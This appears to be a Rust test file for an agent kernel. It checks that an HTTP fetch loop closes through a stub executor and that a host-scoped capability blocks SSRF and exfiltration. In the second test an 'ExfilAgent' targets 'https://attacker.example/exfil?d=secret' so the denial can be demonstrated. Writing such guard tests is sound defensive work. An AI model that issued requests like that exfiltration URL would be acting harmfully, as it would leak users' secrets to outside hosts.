//! End-to-end: an agent RUNS a real fetch loop through the [`HttpExecutor`].
//!
//! A reducer emits an `Http` effect (target = URL); the kernel authorizes it against a SEC-F1 `HostIn`
//! capability (the SSRF/exfil guard), durably dispatches it, the `HttpExecutor` performs the request
//! (here a STUB transport, so the loop is hermetically gateable), and the response body folds back and
//! drives the agent's next step. The REAL client drops into the same wiring behind `live-net`.

use cdz_agent_host::{HttpExecutor, HttpTransport};
use cdz_kernel::authz::Authorizer;
use cdz_kernel::effect::{
    Capability, EffectKind, EffectRequest, Payload, ResourcePredicate, Timeliness,
};
use cdz_kernel::event::{ContentType, EffectOutcome, Event, EventBody};
use cdz_kernel::executor::CompositeExecutor;
use cdz_kernel::hash::Hash;
use cdz_kernel::kernel::Session;
use cdz_kernel::kv::Kv;
use cdz_kernel::reducer::{FoldOutput, Reducer, SyncAsAsync};

/// A stub HTTP transport: returns a canned response body so the fetch loop is hermetic. The real client
/// implements this same trait behind `live-net`.
struct StubHttp;
impl HttpTransport for StubHttp {
    fn request(&self, url: &str, _body: Option<&[u8]>, _key: Hash) -> Result<bytes::Bytes, String> {
        Ok(format!("fetched {url}").into_bytes().into())
    }
}

/// A minimal agent that fetches a URL: on "go" it emits an `Http` effect; when the response comes back
/// it stashes the body and marks itself `fetched`. The loop closes through a real executor.
struct FetchAgent;
impl Reducer for FetchAgent {
    fn fold(&self, event: &Event, kv: &mut Kv) -> FoldOutput {
        match &event.body {
            EventBody::Inbound { .. } => {
                kv.put(b"phase".to_vec(), b"fetching".to_vec());
                FoldOutput::with(vec![EffectRequest {
                    kind: EffectKind::Http,
                    target: "https://ok.host/data".into(),
                    payload: None, // a GET
                    timeliness: Timeliness::Interactive,
                }])
            }
            EventBody::EffectResult {
                result: EffectOutcome::Ok(Some(Payload::Inline(body))),
                ..
            } => {
                kv.put(b"body".to_vec(), body.to_vec());
                kv.put(b"phase".to_vec(), b"fetched".to_vec());
                FoldOutput::none()
            }
            _ => FoldOutput::none(),
        }
    }
}

fn inbound_go() -> EventBody {
    EventBody::Inbound {
        content_type: ContentType {
            family: "message".into(),
            version: 1,
        },
        payload: Payload::Inline(b"go".to_vec().into()),
    }
}

/// Grant `Http` scoped to the one host (SEC-F1 SSRF/exfil guard — deny everything else).
fn host_cap() -> Authorizer {
    Authorizer::new(vec![Capability {
        kind: EffectKind::Http,
        predicate: ResourcePredicate::HostIn(vec!["ok.host".into()]),
    }])
}

#[tokio::test]
async fn agent_loop_runs_end_to_end_through_the_http_executor() {
    let reducer = FetchAgent;
    let mut exec =
        CompositeExecutor::new().with(EffectKind::Http, Box::new(HttpExecutor::new(StubHttp)));
    let mut session = Session::genesis(Hash::of(b"fetch-agent-v1"));

    session
        .deliver_async(
            inbound_go(),
            None,
            &SyncAsAsync(FetchAgent),
            &host_cap(),
            &mut exec,
        )
        .await
        .unwrap();

    // The loop closed: the agent fetched, the executor performed the request, and the response body
    // folded back and advanced the agent to `fetched`.
    assert_eq!(session.kv().get(b"phase"), Some(&b"fetched"[..]));
    assert_eq!(
        String::from_utf8_lossy(session.kv().get(b"body").expect("body recorded")),
        "fetched https://ok.host/data"
    );
    assert_eq!(session.open_effects(), 0);

    // Replay-equivalence: the response is recorded, so replay reconstructs the identical KV without
    // re-fetching.
    let replayed = Session::replay(session.log().to_vec(), &reducer).unwrap();
    assert_eq!(replayed.snapshot().kv_root, session.snapshot().kv_root);
}

#[tokio::test]
async fn a_fetch_to_an_unpermitted_host_is_denied_before_the_client() {
    // Deny-by-default / SEC-F1: the grant is for `ok.host`; an agent fetching a DIFFERENT host (an
    // exfil/SSRF attempt) is denied at the gate — the client (a real network call) is never reached. A
    // transport that panics if called proves the executor was never consulted.
    struct MustNotCall;
    impl HttpTransport for MustNotCall {
        fn request(&self, _u: &str, _b: Option<&[u8]>, _k: Hash) -> Result<bytes::Bytes, String> {
            panic!("a denied Http effect must never reach the client");
        }
    }
    struct ExfilAgent;
    impl Reducer for ExfilAgent {
        fn fold(&self, event: &Event, _kv: &mut Kv) -> FoldOutput {
            if matches!(event.body, EventBody::Inbound { .. }) {
                FoldOutput::with(vec![EffectRequest {
                    kind: EffectKind::Http,
                    target: "https://attacker.example/exfil?d=secret".into(), // outside the grant
                    payload: None,
                    timeliness: Timeliness::Interactive,
                }])
            } else {
                FoldOutput::none()
            }
        }
    }
    let mut exec =
        CompositeExecutor::new().with(EffectKind::Http, Box::new(HttpExecutor::new(MustNotCall)));
    let mut session = Session::genesis(Hash::of(b"exfil-agent-v1"));
    session
        .deliver_async(
            inbound_go(),
            None,
            &SyncAsAsync(ExfilAgent),
            &host_cap(),
            &mut exec,
        )
        .await
        .unwrap();

    // Denied at the gate → a denial is on the log and nothing left open.
    assert!(session
        .log()
        .iter()
        .any(|e| matches!(e.body, EventBody::AuthzDenied { .. })));
    assert_eq!(session.open_effects(), 0);
}
